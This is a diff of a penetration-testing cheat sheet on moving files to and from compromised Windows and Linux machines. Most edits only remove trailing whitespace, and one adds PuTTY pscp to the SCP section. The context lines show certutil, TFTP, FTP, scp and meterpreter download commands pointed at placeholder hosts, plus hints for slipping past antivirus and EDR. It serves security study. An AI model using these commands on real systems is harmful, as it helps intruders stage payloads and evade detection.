@@ -287,14 +287,14 @@ Invoke-SimulateKeyboard $FilePath
 
 ### Client side / file receiver
 
-The following tools can be used to download file from a server client side.  
+The following tools can be used to download file from a server client side.
 
 File transfer is easier on Linux machines as `wget`, `curl` or `netcat` are
-often packaged with the operating system distribution.  
+often packaged with the operating system distribution.
 
 On Windows machines, the process is usually not as straight forward but
 multiples methods can still be used. Transferring the `netcat` utility may
-simplify the subsequent files transfer.  
+simplify the subsequent files transfer.
 
 ###### LOLBINS
 
@@ -316,7 +316,7 @@ find / -type f -executable -exec sh -c "file -i '{}' | grep -q 'x-executable; ch
 ###### [Linux / Windows] echo & base64 encoding
 
 The Linux built-ins `echo` and `base64` and the Windows CMD built-ins `echo` and
-`certutil` can be used to easily transfer files on Linux / Windows systems.   
+`certutil` can be used to easily transfer files on Linux / Windows systems.
 
 Encode the file to be transferred using base64 server-side, copy it to the
 clipboard buffer, and decode it into a file client-side.
@@ -578,7 +578,7 @@ files from a remote webserver by specifying an `URL`.
 
 Note that the usage of `CertUtil` is monitored by most `Endpoint Detection and
 Response` products and downloads through `CertUtil` may generate detection
-alerts.  
+alerts.
 
 ```
 certutil -urlcache -split -f http://<IP>:<PORT>/<FILE> <FILENAME>
@@ -633,7 +633,7 @@ echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 ```
 
-In case of AV errors while trying to download a binary, omit the exe extension.  
+In case of AV errors while trying to download a binary, omit the exe extension.
 
 ###### [Windows XP & 2003] TFTP
 
@@ -643,7 +643,7 @@ therefore it lacks most of the advanced features offered by more robust file
 transfer protocols.
 TFTP only reads and writes files from or to a remote server. It cannot list,
 delete, or rename files or directories and it has no provisions for user
-authentication.  
+authentication.
 
 Windows operating systems up to Windows XP and 2003 contain a TFTP
 client, by default. In Windows 7, 2008, and above, this tool needs to be
@@ -653,13 +653,15 @@ explicitly added, during installation.
 tftp -i <SERVERIP> GET <FILENAME>
 ```
 
-###### [Linux] SCP
+###### [Linux / Windows] SCP / PuTTY pscp
 
-The Linux `Secure Copy` utility can be used to transfer files over `SSH` and
-can notably be used to retrieve and upload files from a compromised target
-exposing a SSH service.  
+The Linux `Secure Copy` and Windows `PuTTY`'s `pscp` utilities can be used to
+transfer files over `SSH` and can notably be used to retrieve and upload files
+from a compromised target exposing a `SSH` service.
 
 ```
+# The scp utility can be replaced by pscp in the following commands for transfer from a Windows computer.
+
 # Download remote <FILENAME> from <HOSTNAME | IP>
 scp <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME> <. | DOWNLOADED_PATH>
 scp -i <KEY> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME> <. | DOWNLOADED_PATH>
@@ -707,7 +709,7 @@ meterpreter> upload -r <DIRECTORY>
 The following Python code extends the Python `SimpleHTTPServer` module to
 process HTTP PUT request and store, in the directory the script was started,
 the PUT request body content as a file. The filename is specified in the URL
-requested.   
+requested.
 
 Original author: Floating Octothorpe,
 `https://f-o.org.uk/2017/receiving-files-over-http-with-python.html`.
@@ -769,7 +771,11 @@ python http_put_server.py
 ### References
 
 https://lolbas-project.github.io/
+
 https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
+
 https://github.com/frizb/Windows-Privilege-Escalation
+
 https://github.com/cube0x0/CVE-2021-1675
+
 https://www.giac.org/paper/gcwn/22/limiting-anonymous-logon-network-access-named-pipes-shares/100328
